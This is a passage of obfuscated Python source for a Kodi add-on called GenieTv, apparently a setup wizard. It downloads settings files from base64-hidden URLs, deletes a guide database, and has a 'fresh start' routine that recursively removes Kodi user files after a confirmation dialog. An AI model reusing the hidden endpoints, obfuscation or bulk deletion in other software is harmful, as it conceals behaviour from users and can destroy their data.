 if i1iiIIiiI111 . yesno ( "GenieTv" , '                                    Install Latest .ini File' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV INI###'
  Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  I11OoooO = os . path . join ( Oo0OO0000oooo , 'addons2.ini' )
  oo0OoOOO0o0 = i1 . http_GET ( url ) . content
  IiII1 = open ( I11OoooO , "w" )
  IiII1 . write ( oo0OoOOO0o0 )
  IiII1 . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New .ini File" )
 return
 if 49 - 49: i1IIi - i11i1 / OOooOOo % iI1Ii11iII1 - oOO
def O00O0OO ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                               Install Custom Settings' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV SETTINGS###'
  Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  I11OoooO = os . path . join ( Oo0OO0000oooo , 'settings.xml' )
  oo0OoOOO0o0 = i1 . http_GET ( url ) . content
  IiII1 = open ( I11OoooO , "w" )
  IiII1 . write ( oo0OoOOO0o0 )
  IiII1 . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New Settings" )
 return
 if 76 - 76: OOOo0
 if 41 - 41: I1IiI % I1I1ii * Ooo0OO0oOO * i1IIi
def IiIii1i ( ) :
 try :
  I1i11i1II = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  if os . path . exists ( I1i11i1II ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "GenieTv" , "                               Delete FTV Guide Database" ) :
    OOoOo0oOooo = os . path . join ( I1i11i1II , "source.db" )
    os . unlink ( OOoOo0oOooo )
  i1iiIIiiI111 . ok ( "GenieTv" , "                                     FTV Database Reset" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "               Error Deleting Database No Database To Delete" )
 return
 if 99 - 99: OOooOOo / i11i1 / Ooo0OO0oOO . I1I1ii
 if 3 - 3: OOoo0OO0
 if 26 - 26: Ooo00oOo00o % i1IIi * O0 . I1I1ii
 if 31 - 31: O0 - iI1Ii11iII1 * i11iIiiIii * i1IIi
 if 78 - 78: oOO * I1IiI . oO0O . I1IiI % iIii1I11I1II1
def i11iIIIIIi1 ( url ) :
 IIiiiI1iI = urllib2 . Request ( url )
 IIiiiI1iI . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O0O0 = urllib2 . urlopen ( IIiiiI1iI )
 oo0OoOOO0o0 = O0O0 . read ( )
 O0O0 . close ( )
 return oo0OoOOO0o0
 if 67 - 67: oO0O . Oo
 if 39 - 39: OOoo0OO0 * I1I1ii
 if 63 - 63: oOO % OOOo0 . i11i1 - oOO / Oo % OOOo0
 if 39 - 39: OOooOOo . i1IIi % Ooo0OO0oOO / OOoo0OO0 % O0
 if 100 - 100: I1I1ii - I1IiI
 if 78 - 78: OoooooooOO - I1IiI . i11iIiiIii
 if 36 - 36: Ooo0OO0oOO * II1i1IiiIIi11 + iI1Ii11iII1 * II1i1IiiIIi11 . ii11ii1ii - iIii1I11I1II1
def i1IIi1ii1i1ii ( params ) :
 plugintools . log ( "freshstart.main_list " + repr ( params ) ) ; oOoOO = plugintools . message_yes_no ( o0oOoO00o , "Do you wish to restore your" , "Kodi configuration to default settings?" )
 if oOoOO :
  Iiii111I1IiiI1i = xbmcaddon . Addon ( id = o00 ) . getAddonInfo ( 'path' ) ; Iiii111I1IiiI1i = xbmc . translatePath ( Iiii111I1IiiI1i ) ;
  Ii1IOOO0oOo00o0 = os . path . join ( Iiii111I1IiiI1i , ".." , ".." ) ; Ii1IOOO0oOo00o0 = os . path . abspath ( Ii1IOOO0oOo00o0 ) ; plugintools . log ( "freshstart.main_list xbmcPath=" + Ii1IOOO0oOo00o0 ) ; Iii1IiIIiII1 = False
  try :
   for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( Ii1IOOO0oOo00o0 , topdown = True ) :
    i1oO0OO0 [ : ] = [ oO0o00oOOooO0 for oO0o00oOOooO0 in i1oO0OO0 if oO0o00oOOooO0 not in iiIIIII1i1iI ]
    for OO0ooOOO0OOO in o0O0Oo00 :
     try : os . remove ( os . path . join ( I1i1iii1Ii , OO0ooOOO0OOO ) )
     except :
      if OO0ooOOO0OOO not in [ "Addons15.db" , "MyVideos75.db" , "Textures13.db" , "xbmc.log" ] : Iii1IiIIiII1 = True
      plugintools . log ( "Error removing " + I1i1iii1Ii + " " + OO0ooOOO0OOO )
    for OO0ooOOO0OOO in i1oO0OO0 :
     try : os . rmdir ( os . path . join ( I1i1iii1Ii , OO0ooOOO0OOO ) )
     except :
      if OO0ooOOO0OOO not in [ "Database" , "userdata" ] : Iii1IiIIiII1 = True
      plugintools . log ( "Error removing " + I1i1iii1Ii + " " + OO0ooOOO0OOO )
   if not Iii1IiIIiII1 : plugintools . log ( "freshstart.main_list All user files removed, you now have a clean install" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv!" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
   else : plugintools . log ( "freshstart.main_list User files partially removed" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
  except : plugintools . message ( o0oOoO00o , "Problem found" , "Your settings has not been changed" ) ; import traceback ; plugintools . log ( traceback . format_exc ( ) ) ; plugintools . log ( "freshstart.main_list NOT removed" )
  plugintools . add_item ( action = "" , title = "Now Exit Kodi" , folder = False )
 else : plugintools . message ( o0oOoO00o , "Your settings" , "has not been changed" ) ; plugintools . add_item ( action = "" , title = "Done" , folder = False )
 oOO0OO0OO ( )
 if 9 - 9: ii11ii1ii - iI1Ii11iII1
 if 64 - 64: i1IIi
 if 71 - 71: iI1Ii11iII1 * OOooOOo
def oo00oOoo ( ) :
 oOOO0oo0 = [ ]
 iI1IiiiiI = sys . argv [ 2 ]
 if len ( iI1IiiiiI ) >= 2 :
  Ii1Ooo0OO00oo = sys . argv [ 2 ]
  i11iII1IiI = Ii1Ooo0OO00oo . replace ( '?' , '' )
  if ( Ii1Ooo0OO00oo [ len ( Ii1Ooo0OO00oo ) - 1 ] == '/' ) :
   Ii1Ooo0OO00oo = Ii1Ooo0OO00oo [ 0 : len ( Ii1Ooo0OO00oo ) - 2 ]
  i1II1IiIi111 = i11iII1IiI . split ( '&' )
  oOOO0oo0 = { }
  for IIiI1111i1 in range ( len ( i1II1IiIi111 ) ) :
   ooo = { }
   ooo = i1II1IiIi111 [ IIiI1111i1 ] . split ( '=' )
   if ( len ( ooo ) ) == 2 :
    oOOO0oo0 [ ooo [ 0 ] ] = ooo [ 1 ]
    if 18 - 18: oO0O + I1IiI . i1IIi / iI1Ii11iII1 / II1i1IiiIIi11
 return oOOO0oo0
 if 97 - 97: Ooo00oOo00o + iIii1I11I1II1
I11I1IIiiII1 = base64 . decodestring ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkbw==' )
ii1II = base64 . decodestring ( 'L3N0b3JhZ2UvZW11bGF0ZWQvMA==' )
IIIIIii1ii11 = base64 . decodestring ( 'L2dlbmllLnR4dA==' )
O0OOoo = base64 . decodestring ( 'LmFyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdC93aC50eHQ=' )
iiI11I1i1i1iI = base64 . decodestring ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9maXhlcy9maXhlcy50eHQ=' )
i1Ii1 = base64 . decodestring ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9hcHBzL2FwcHMueG1s' )
o0O0o = base64 . decodestring ( 'L2FkZG9ucy9uZXcudHh0' )
Ii111OO0o0o0OOoooo = base64 . decodestring ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby92b2Qvdm9kLnBocA==' )
O0ooOIii1iIIIi11I1 = base64 . decodestring ( 'L2FkZG9ucy9pcHR2LnR4dA==' )
III11I11iIi1 = base64 . decodestring ( 'L2FkZG9ucy92aWRlby50eHQ=' )
Oo0o0OoOoOo0 = base64 . decodestring ( 'L2FkZG9ucy9zcG9ydHMudHh0' )
iII1i111iI = base64 . decodestring ( 'L2FkZG9ucy9raWRzLnR4dA==' )
OoO00oO0o00 = base64 . decodestring ( 'L2FkZG9ucy9tdXNpYy50eHQ=' )
oOoO0o0o = base64 . decodestring ( 'L2FkZG9ucy9wcm9ncmFtcy50eHQ=' )
oOo0OOoO0ooOOoo = base64 . decodestring ( 'L2FkZG9ucy94eHgudHh0' )
oo0OoOI11iIiiI = base64 . decodestring ( 'L2FkZG9ucy9yZXBvLnR4dA==' )
Ii1i1i1111 = base64 . decodestring ( 'L2FkZG9ucy9wYWNrcy50eHQ=' )
oOO00OOOO0o = base64 . decodestring ( 'L2FkZG9ucy9za2lucy50eHQ=' )
II11I = base64 . decodestring ( 'L2FkZG9ucy9hcnQudHh0' )
I11oo0ooOO = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2dvdGhhbS50eHQ=' )
iIiIi11Ii = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2hlbGl4LnR4dA==' )
Iiii11iIi1 = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2lzZW5nYXJkLnR4dA==' )
OOOoOOOo = base64 . decodestring ( 'L2FkZG9ucy9SU1MudHh0' )
II11iIi = base64 . decodestring ( 'Q1VOVA==' )
def O00OOOoOoo0O ( name , url , mode , iconimage , fanart , description , showcontext = True , allinfo = { } ) :
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iii11I11iI1 . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  OO00O00o0O = [ ]
  if showcontext == 'fav' :
   OO00O00o0O . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   OO00O00o0O . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  iii11I11iI1 . addContextMenuItems ( OO00O00o0O )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = True )
 return II1I1
 if 86 - 86: OOooOOo % Ooo00oOo00o + ii11ii1ii
def ooo00OOOooO ( name , url , mode , iconimage , fanart , description ) :
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iii11I11iI1 . setProperty ( "Fanart_Image" , fanart )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = False )
 return II1I1
 if 69 - 69: iI1Ii11iII1
 if 24 - 24: Ooo00oOo00o / O0 * oOO % iIii1I11I1II1 + i1IIi % O0
Ii1Ooo0OO00oo = oo00oOoo ( )
I1i11i = None
OO0ooOOO0OOO = None
OOoOoo00Oo = None
IiI = None
iI1ii1i = None
o0OoOO = None
I1I11i = None
if 93 - 93: OoOoOO00 . OOoo0OO0 - i1IIi * I1IiI
if 28 - 28: OOoo0OO0 % I1I1ii
try :
 I1I11i = int ( Ii1Ooo0OO00oo [ "fav_mode" ] )
except :
 pass
 if 49 - 49: iI1Ii11iII1 % OOooOOo . ii11ii1ii / i11i1 . oO0O * ii11ii1ii
try :
 I1i11i = urllib . unquote_plus ( Ii1Ooo0OO00oo [ "url" ] )
except :
 pass
try :
 OO0ooOOO0OOO = urllib . unquote_plus ( Ii1Ooo0OO00oo [ "name" ] )
except :
 pass
try :
 IiI = urllib . unquote_plus ( Ii1Ooo0OO00oo [ "iconimage" ] )
except :
 pass
try :
 OOoOoo00Oo = int ( Ii1Ooo0OO00oo [ "mode" ] )
except :
 pass
try :
 iI1ii1i = urllib . unquote_plus ( Ii1Ooo0OO00oo [ "fanart" ] )
except :
 pass
try :
 o0OoOO = urllib . unquote_plus ( Ii1Ooo0OO00oo [ "description" ] )
except :
 pass
 if 17 - 17: ii11ii1ii * OoooooooOO % i1IIi % OoooooooOO . II1i1IiiIIi11
 if 20 - 20: Ooo00oOo00o . Ooo0OO0oOO
print str ( O0OoO000O0OO ) + ': ' + str ( O00ooOO )
print "Mode: " + str ( OOoOoo00Oo )
print "URL: " + str ( I1i11i )
print "Name: " + str ( OO0ooOOO0OOO )
print "IconImage: " + str ( IiI )
if 4 - 4: Oo % oO0O % Ooo00oOo00o * II1i1IiiIIi11 % OoooooooOO
if 38 - 38: OoooooooOO . II1i1IiiIIi11
def Oo0oO ( content , viewType ) :
 if 43 - 43: OoooooooOO
 if content :
  xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , content )
 if o0oO0 . getSetting ( 'auto-view' ) == 'true' :
  xbmc . executebuiltin ( "Container.SetViewMode(%s)" % o0oO0 . getSetting ( viewType ) )
  if 8 - 8: i11i1 + OOoo0OO0 . OOoo0OO0
  if 89 - 89: ii11ii1ii * ii11ii1ii * I1IiI / II1i1IiiIIi11
if OOoOoo00Oo == None :
 oOOo0 ( )
 if 60 - 60: Ooo00oOo00o / II1i1IiiIIi11 / OOOo0 + Ooo0OO0oOO
elif OOoOoo00Oo == 1 :
 o0OIIiI1I1 ( I1i11i )
 if 93 - 93: OoooooooOO * oO0O / O0 + oO0O - iIii1I11I1II1
elif OOoOoo00Oo == 44 :
 iiii1I1 ( I1i11i )
 if 6 - 6: iI1Ii11iII1 - Oo - OOoo0OO0 - O0 % OoooooooOO
elif OOoOoo00Oo == 2 :
 O00oOo ( )
 if 88 - 88: O0 / OOooOOo * OOooOOo . OOooOOo . O0
elif OOoOoo00Oo == 3 :
 iIi1iI111I ( )
 if 27 - 27: i11iIiiIii % II1i1IiiIIi11 + oO0O . i11i1
elif OOoOoo00Oo == 21 :
 iI1Ii11111iIi ( )
 if 9 - 9: Ooo00oOo00o
elif OOoOoo00Oo == 4 :
 ii1Ii1IiIIi ( )
 if 43 - 43: oO0O . i11i1 + OOOo0 * i11iIiiIii
elif OOoOoo00Oo == 5 :
 iIIIi1i1I11i ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 2 - 2: i11i1
elif OOoOoo00Oo == 6 :
 IiIIiIiIIiI ( I1i11i )
 if 3 - 3: OOOo0 . II1i1IiiIIi11 % O0 - oOO / O0
elif OOoOoo00Oo == 7 :
 IIIiii ( I1i11i , OO0ooOOO0OOO )
 if 79 - 79: oO0O + Ooo0OO0oOO % oOO % OOOo0
elif OOoOoo00Oo == 8 :
 oOOO00OOo ( I1i11i , OO0ooOOO0OOO )
 if 68 - 68: OoOoOO00 - OoooooooOO / iIii1I11I1II1 - OOooOOo % OoOoOO00
elif OOoOoo00Oo == 9 :
 FIXREPOSADDONS ( I1i11i )
 if 53 - 53: II1i1IiiIIi11 . Ooo0OO0oOO / Oo . Ooo00oOo00o . i11iIiiIii
elif OOoOoo00Oo == 10 :
 o0Oo00 ( )
 if 60 - 60: OoOoOO00
elif OOoOoo00Oo == 11 :
 IiiIiIIiiIiI ( I1i11i )
 if 25 - 25: Oo + OOooOOo - Ooo00oOo00o
elif OOoOoo00Oo == 12 :
 oOO0oOoooOoo0 ( )
 if 57 - 57: OoOoOO00 . i1IIi
elif OOoOoo00Oo == 13 :
 I1Iii11111I1iii ( )
 if 33 - 33: II1i1IiiIIi11 + Oo % OOoo0OO0 . Ooo0OO0oOO
elif OOoOoo00Oo == 14 :
 iII1 ( I1i11i )
 if 6 - 6: iI1Ii11iII1 + ii11ii1ii
elif OOoOoo00Oo == 15 :
 IIi1IIIIi ( )
 if 62 - 62: Ooo0OO0oOO . I1I1ii - OoooooooOO * OoOoOO00 . i11iIiiIii
elif OOoOoo00Oo == 16 :
 O0O00Oo ( I1i11i , OO0ooOOO0OOO )
 if 13 - 13: iIii1I11I1II1 * OOooOOo - i11iIiiIii
elif OOoOoo00Oo == 17 :
 O00O0OO ( I1i11i , OO0ooOOO0OOO )
 if 63 - 63: OoooooooOO * I1I1ii
elif OOoOoo00Oo == 18 :
 IiIii1i ( )
 if 50 - 50: Oo - OOooOOo % OoOoOO00 . O0 . Ooo0OO0oOO % OoOoOO00
elif OOoOoo00Oo == 19 :
 oOoOoo0 ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 18 - 18: OOoo0OO0 % OoooooooOO + Ooo00oOo00o / OOoo0OO0
elif OOoOoo00Oo == 40 :
 Iii111Ii ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 37 - 37: i1IIi - oO0O / iI1Ii11iII1 . OoOoOO00 % oOO
elif OOoOoo00Oo == 42 :
 o0OO0O0Oo ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 39 - 39: oO0O % i11iIiiIii * Ooo00oOo00o
elif OOoOoo00Oo == 43 :
 IiI1 ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 23 - 23: i11i1 + oOO / i11iIiiIii * Oo . Ooo00oOo00o
elif OOoOoo00Oo == 20 :
 Oooooooo0o ( I1i11i )
 if 28 - 28: II1i1IiiIIi11 - OOooOOo
elif OOoOoo00Oo == 22 :
 OoiIIii1Ii1 ( I1i11i )
 if 92 - 92: Oo % OOooOOo - oOO / oOO / I1IiI
elif OOoOoo00Oo == 23 :
 O0O00O ( I1i11i )
 if 84 - 84: i11i1
elif OOoOoo00Oo == 24 :
 I11II1 ( I1i11i )
 if 4 - 4: iI1Ii11iII1 . I1I1ii / oO0O / II1i1IiiIIi11 + OoOoOO00
elif OOoOoo00Oo == 25 :
 oo0OoOO000O ( I1i11i )
 if 32 - 32: i1IIi + iIii1I11I1II1 . ii11ii1ii . OOoo0OO0 - oO0O
elif OOoOoo00Oo == 26 :
 O0ooO0 ( I1i11i )
 if 55 - 55: ii11ii1ii / OoooooooOO - Ooo00oOo00o / OOOo0
elif OOoOoo00Oo == 27 :
 iiI1II1II111 ( I1i11i )
 if 23 - 23: OOoo0OO0 * I1I1ii * OOooOOo - OOOo0 % I1IiI + OOooOOo
elif OOoOoo00Oo == 28 :
 OOO0OOoOOO ( I1i11i )
 if 41 - 41: iI1Ii11iII1 * OoooooooOO . oOO % i11iIiiIii
elif OOoOoo00Oo == 29 :
 i1iI11iI ( I1i11i )
 if 11 - 11: iIii1I11I1II1 . I1I1ii - Oo / OOoo0OO0 + OoOoOO00
elif OOoOoo00Oo == 30 :
 Ii11Iii1i1ii ( I1i11i )
 if 29 - 29: OOoo0OO0 . i11iIiiIii + i1IIi - oO0O + O0 . OOOo0
elif OOoOoo00Oo == 31 :
 IIiIi1II1IiI ( I1i11i )
 if 8 - 8: OOooOOo
elif OOoOoo00Oo == 32 :
 Ii111 ( )
 if 78 - 78: i1IIi - Oo
elif OOoOoo00Oo == 33 :
 oooo00 ( )
 if 48 - 48: oO0O - OoooooooOO + I1I1ii % OOooOOo - I1IiI . OOOo0
elif OOoOoo00Oo == 35 :
 i11I1I1iiI ( I1i11i )
 if 42 - 42: I1I1ii
elif OOoOoo00Oo == 34 :
 o0OoO00o0000O ( I1i11i )
 if 70 - 70: OOooOOo / OOoo0OO0 + Ooo0OO0oOO % OOOo0 % Oo + Ooo00oOo00o
elif OOoOoo00Oo == 36 :
 o0O0O0 ( I1i11i )
 if 80 - 80: i11i1
elif OOoOoo00Oo == 37 :
 III ( I1i11i )
 if 12 - 12: oO0O
elif OOoOoo00Oo == 38 :
 II11 ( I1i11i )
 if 2 - 2: OoooooooOO
elif OOoOoo00Oo == 41 :
 i1IIi1ii1i1ii ( Ii1Ooo0OO00oo )
 if 100 - 100: Oo / O0 * i11iIiiIii * OoooooooOO
elif OOoOoo00Oo == 39 :
 OooOoO0OO00 ( I1i11i )
 if 46 - 46: O0 % OoooooooOO
elif OOoOoo00Oo == 45 :
 TEXTS ( )
 if 22 - 22: II1i1IiiIIi11 + OoooooooOO - I1IiI - Ooo00oOo00o * I1I1ii - Ooo0OO0oOO
elif OOoOoo00Oo == 46 :
 ooooOoo00 ( )
 if 99 - 99: oOO / OOOo0 . oO0O - oO0O * OOOo0
elif OOoOoo00Oo == 47 :
 GEVID ( )
 if 24 - 24: OOoo0OO0 * Ooo00oOo00o - Ooo0OO0oOO / iIii1I11I1II1 - Oo . i11i1
elif OOoOoo00Oo == 48 :
 IIioo0OO ( OO0ooOOO0OOO , I1i11i , o0OoOO )
 if 2 - 2: oOO - O0 - ii11ii1ii / OOoo0OO0 * I1IiI
elif OOoOoo00Oo == 49 :
 II1Ii11Ii1i1I ( )
 if 26 - 26: ii11ii1ii + I1I1ii - Ooo0OO0oOO + iI1Ii11iII1 % i11i1
elif OOoOoo00Oo == 222 :
 I1i111I ( I1i11i )
 if 84 - 84: OOoo0OO0 % oO0O % O0 * OOooOOo
elif OOoOoo00Oo == 333 :
 I1iI ( I1i11i )
 if 15 - 15: Ooo0OO0oOO - iIii1I11I1II1 - OoOoOO00 - iI1Ii11iII1 % ii11ii1ii
 if 80 - 80: iI1Ii11iII1 * II1i1IiiIIi11 . i1IIi % oO0O % ii11ii1ii + oOO
elif OOoOoo00Oo == 1020 :
 OoOO ( )
 if 6 - 6: ii11ii1ii . Ooo0OO0oOO . Ooo00oOo00o + iI1Ii11iII1
elif OOoOoo00Oo == 1021 :
 ANIMEEP ( )
 if 65 - 65: ii11ii1ii / oOO
elif OOoOoo00Oo == 1022 :
 ANIMEPLAY ( I1i11i )
 if 23 - 23: i11i1 / i11i1 * OOooOOo * i11i1
elif OOoOoo00Oo == 1001 :
 Iii1i1Ii ( )
 if 57 - 57: II1i1IiiIIi11
elif OOoOoo00Oo == 1005 :
 I1IIiIi1I1I1 ( )
 if 29 - 29: OOOo0
elif OOoOoo00Oo == 1007 :
 IIi1iI11Ii ( I1i11i )
 if 41 - 41: I1I1ii * Ooo00oOo00o - II1i1IiiIIi11 . oO0O
elif OOoOoo00Oo == 1010 :
 OOOo0Ooo0 ( I1i11i )
 if 41 - 41: iIii1I11I1II1 - O0 - ii11ii1ii - Ooo0OO0oOO + I1I1ii
elif OOoOoo00Oo == 1011 :
 III1 ( I1i11i )
 if 22 - 22: O0 % iI1Ii11iII1 % II1i1IiiIIi11 % OOOo0
elif OOoOoo00Oo == 1030 :
 IIi1iI1i ( )
 if 34 - 34: II1i1IiiIIi11 . Oo % ii11ii1ii . II1i1IiiIIi11 % iI1Ii11iII1 / iI1Ii11iII1
elif OOoOoo00Oo == 1031 :
 Iii11II1 ( I1i11i , IiI )
 if 84 - 84: oO0O
elif OOoOoo00Oo == 1006 :
 Parse . ParseURL ( I1i11i )
 if 1 - 1: Ooo0OO0oOO - Oo * iIii1I11I1II1 * Oo * i1IIi
elif OOoOoo00Oo == 2030 :
 Parse . addonParseURL ( I1i11i )
 if 9 - 9: II1i1IiiIIi11 - II1i1IiiIIi11
elif OOoOoo00Oo == 2031 :
 Parse . apkParseURL ( I1i11i )
 if 3 - 3: O0 + O0 - O0 - O0 % OoooooooOO + Ooo0OO0oOO
elif OOoOoo00Oo == 1002 :
 o0o0OOo0OOoO ( I1i11i )
 if 20 - 20: Ooo00oOo00o + OOoo0OO0 . OoOoOO00 / i11iIiiIii
elif OOoOoo00Oo == 1003 :
 O0ooO ( I1i11i , IiI )
 if 50 - 50: OoooooooOO / Ooo00oOo00o % iIii1I11I1II1
elif OOoOoo00Oo == 1004 :
 i1Ii1IiiIi1II ( I1i11i )
 if 41 - 41: ii11ii1ii % ii11ii1ii + iI1Ii11iII1 . II1i1IiiIIi11 % I1I1ii * oOO
elif OOoOoo00Oo == 1008 :
 ii1I ( )
 if 57 - 57: oO0O . I1I1ii . OoOoOO00 % OoooooooOO * O0 + iIii1I11I1II1
elif OOoOoo00Oo == 1009 :
 M3UPLAY ( I1i11i )
 if 94 - 94: i1IIi * Ooo00oOo00o * I1IiI
elif OOoOoo00Oo == 2001 :
 Oo00o ( I1i11i )
 if 93 - 93: oOO / i11i1 * O0
elif OOoOoo00Oo == 1013 :
 IIIII1iii11 ( )
 if 17 - 17: Ooo00oOo00o / oOO % OOOo0
elif OOoOoo00Oo == 1014 :
 oOoOOOO0OOO ( )
 if 47 - 47: Oo * Ooo00oOo00o / OOooOOo * OOOo0
elif OOoOoo00Oo == 1015 :
 O0oo0oO00o ( I1i11i )
 if 60 - 60: ii11ii1ii / iI1Ii11iII1 . i11iIiiIii / Ooo00oOo00o % OoOoOO00
elif OOoOoo00Oo == 1016 :
 O00O0 ( I1i11i , IiI , OO0ooOOO0OOO )
 if 6 - 6: II1i1IiiIIi11 % OOooOOo + I1I1ii
elif OOoOoo00Oo == 1023 :
 OoOO00 ( )
 if 91 - 91: OOooOOo + O0 * Ooo0OO0oOO * iI1Ii11iII1 * ii11ii1ii
elif OOoOoo00Oo == 1024 :
 iIi ( )
 if 83 - 83: OoooooooOO
elif OOoOoo00Oo == 1025 :
 OoiiI11111II ( I1i11i )
 if 52 - 52: OOooOOo / I1IiI % Ooo0OO0oOO % Ooo00oOo00o / iI1Ii11iII1 % OOooOOo
elif OOoOoo00Oo == 4001 :
 OooOOOOo ( )
 if 88 - 88: i11i1 / i11iIiiIii / oO0O / i11iIiiIii * ii11ii1ii % OOoo0OO0
elif OOoOoo00Oo == 4002 :
 oo0O0oO ( )
 if 43 - 43: I1IiI * Ooo00oOo00o % i1IIi * oO0O + iIii1I11I1II1
elif OOoOoo00Oo == 4003 :
 OOOooo ( )
 if 80 - 80: OOooOOo . II1i1IiiIIi11 . OoooooooOO
elif OOoOoo00Oo == 4004 :
 ii1 ( )
 if 63 - 63: oOO . i11i1
elif OOoOoo00Oo == 4005 :
 iI111i ( )
 if 66 - 66: OOOo0
elif OOoOoo00Oo == 4006 :
 IIi11i1i1iI1 ( )
 if 99 - 99: Ooo00oOo00o % O0 . I1I1ii - ii11ii1ii . Oo / I1IiI
elif OOoOoo00Oo == 4007 :
 oOo0oO ( )
 if 60 - 60: ii11ii1ii
elif OOoOoo00Oo == 4008 :
 OOOO0oo0 ( )
 if 78 - 78: Ooo0OO0oOO + OoOoOO00
elif OOoOoo00Oo == 4009 : I1iI1iIi111i ( )
elif OOoOoo00Oo == 4010 : ooo000o000 ( )
elif OOoOoo00Oo == 3000 :
 IIiIi11i111II ( )
 if 55 - 55: OoooooooOO
elif OOoOoo00Oo == 3001 :
 iiiiIi1 ( )
 if 90 - 90: OOOo0
elif OOoOoo00Oo == 3002 :
 ooiiI1IIIii ( I1i11i )
 if 4 - 4: i11i1 % oOO - i11i1 - OOooOOo
elif OOoOoo00Oo == 3003 :
 iIOO0OOoooo0o ( I1i11i )
 if 30 - 30: iI1Ii11iII1
elif OOoOoo00Oo == 3004 :
 iiIIiI11II1 ( I1i11i )
 if 34 - 34: Ooo0OO0oOO - OoOoOO00 - OOooOOo + II1i1IiiIIi11 + I1I1ii
elif OOoOoo00Oo == 404 :
 II1I11 ( OO0ooOOO0OOO , I1i11i , IiI )
 if 70 - 70: OoooooooOO + Ooo00oOo00o * Oo
elif OOoOoo00Oo == 405 :
 iiI1ii1i1 ( I1i11i )
 if 20 - 20: i11iIiiIii - OoOoOO00 - oOO % Ooo0OO0oOO . oOO
elif OOoOoo00Oo == 7030 :
 Iiii ( )
 if 50 - 50: iIii1I11I1II1 + I1I1ii - OOoo0OO0 - OoooooooOO
elif OOoOoo00Oo == 7021 :
 Oooo ( OO0ooOOO0OOO )
 if 84 - 84: I1IiI - OOoo0OO0
elif OOoOoo00Oo == 7022 :
 OO0 ( OO0ooOOO0OOO )
 if 80 - 80: i11iIiiIii % i11i1 - Oo % i11i1
elif OOoOoo00Oo == 7000 :
 IIIIii11II1I ( OO0ooOOO0OOO , I1i11i , img )
 if 89 - 89: oO0O * OOoo0OO0 + I1IiI / i11iIiiIii
elif OOoOoo00Oo == 7050 :
 OOOOooO0 ( I1i11i )
 if 68 - 68: OoooooooOO * OOoo0OO0
elif OOoOoo00Oo == 7051 :
 Iii1I ( I1i11i )
 if 86 - 86: OOooOOo / I1IiI
